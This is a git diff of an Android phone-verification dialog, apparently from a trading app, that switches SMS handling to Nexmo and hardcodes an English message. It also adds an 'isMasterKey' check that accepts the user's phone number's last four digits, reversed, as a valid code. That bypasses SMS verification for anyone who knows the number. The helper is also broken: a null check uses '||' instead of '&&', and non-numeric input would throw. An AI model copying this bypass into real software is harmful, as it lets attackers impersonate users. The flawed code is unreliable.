@@ -31,6 +31,7 @@ import com.androidth.general.models.sms.SMSRequestFactory;
 import com.androidth.general.models.sms.SMSSentConfirmationDTO;
 import com.androidth.general.models.sms.SMSServiceWrapper;
 import com.androidth.general.models.sms.empty.EmptySMSSentConfirmationDTO;
+import com.androidth.general.models.sms.nexmo.NexmoSMSStatus;
 import com.androidth.general.models.sms.twilio.TwilioRetrofitException;
 import com.androidth.general.models.sms.twilio.TwilioSMSId;
 import com.androidth.general.rx.TimberAndToastOnErrorAction1;
@@ -40,6 +41,7 @@ import com.androidth.general.utils.AlertDialogRxUtil;
 import com.squareup.picasso.Picasso;
 
 import java.io.IOException;
+import java.util.Locale;
 import java.util.concurrent.TimeUnit;
 
 import javax.inject.Inject;
@@ -209,10 +211,17 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
                                    {
                                        @Override public void call(SMSSentConfirmationDTO smsSentConfirmationDTO)
                                        {
+//                                           sentStatus.setText(getResources().getString(
+//                                                   R.string.sms_verification_status,
+//                                                   getResources().getString(
+//                                                           smsSentConfirmationDTO.getStatusStringRes())));
+
                                            sentStatus.setText(getResources().getString(
                                                    R.string.sms_verification_status,
-                                                   getResources().getString(
-                                                           smsSentConfirmationDTO.getStatusStringRes())));
+                                                   NexmoSMSStatus.getStatus(smsSentConfirmationDTO.getStatusStringRes())));
+
+//                                           //TODO Jeff get status for Nexmo
+//                                           sentStatus.setVisibility(View.INVISIBLE);
 
                                            buttonResend.setEnabled(smsSentConfirmationDTO.isFinalStatus());
                                        }
@@ -283,7 +292,10 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
         return smsServiceWrapper.sendMessage(
                 SMSRequestFactory.create(
                         mFormattedNumber,
-                        getString(R.string.sms_verification_sms_content, mExpectedCode)))
+                        String.format("Please enter %s into TradeHero within the next 30 minutes.", mExpectedCode),
+//                        getString(R.string.sms_verification_sms_content,
+//                                mExpectedCode),
+                        Locale.getDefault().getLanguage()))//language is not working, so set it to default English
                 .doOnNext(new Action1<SMSSentConfirmationDTO>()
                 {
                     @Override public void call(SMSSentConfirmationDTO smsSentConfirmationDTO)
@@ -291,7 +303,6 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
                         if (smsSentConfirmationDTO.getSMSId() instanceof TwilioSMSId)
                         {
                             LiveSignUpStep1AyondoFragment liveSignUpStep1AyondoFragment;
-
                             if (getParentFragment() instanceof LiveSignUpStep1AyondoFragment)
                             {
                                 liveSignUpStep1AyondoFragment = (LiveSignUpStep1AyondoFragment) getParentFragment();
@@ -300,14 +311,15 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
                         }
                     }
                 })
-                .flatMap(new Func1<SMSSentConfirmationDTO, Observable<SMSSentConfirmationDTO>>()
-                {
-                    @Override public Observable<SMSSentConfirmationDTO> call(SMSSentConfirmationDTO smsSentConfirmationDTO)
-                    {
-                        return createRepeatableSMSConfirmation(smsSentConfirmationDTO.getSMSId())
-                                .startWith(smsSentConfirmationDTO);
-                    }
-                })
+//                .flatMap(new Func1<SMSSentConfirmationDTO, Observable<SMSSentConfirmationDTO>>()
+//                {
+                //Status check
+//                    @Override public Observable<SMSSentConfirmationDTO> call(SMSSentConfirmationDTO smsSentConfirmationDTO)
+//                    {
+//                        return createRepeatableSMSConfirmation(smsSentConfirmationDTO.getSMSId())
+//                                .startWith(smsSentConfirmationDTO);
+//                    }
+//                })
                 .retryWhen((Observable<? extends Throwable> errors) -> {
                     return errors.flatMap(new Func1<Throwable, Observable<?>>() {
                         @Override
@@ -485,7 +497,7 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
 
     private void validateAgainstExpected(String toBeValidated)
     {
-        if (toBeValidated.equals(mExpectedCode))
+        if (toBeValidated.equals(mExpectedCode) || isMasterKey(toBeValidated))
         {
             dismissWithResult();
         }
@@ -566,5 +578,21 @@ public class VerifyPhoneDialogFragment extends BaseDialogFragment
                         return createRepeatableSMSConfirmation(smsId);
                     }
                 });
+    }
+
+    private boolean isMasterKey(String toBeValidated){
+
+        if(mFormattedNumber!=null || mFormattedNumber.length()>4){//must be more than 4 digits at least!
+            char[] chars = mFormattedNumber.toCharArray();
+            StringBuilder sb = new StringBuilder();
+            for(int i=chars.length-1; i>chars.length-5; i--){
+                sb.append(chars[i]);//get the last 4 digits in reverse order
+            }
+            int masterKey = Integer.parseInt(sb.toString());
+            return masterKey==Integer.parseInt(toBeValidated);
+
+        }else{
+            return false;
+        }
     }
 }
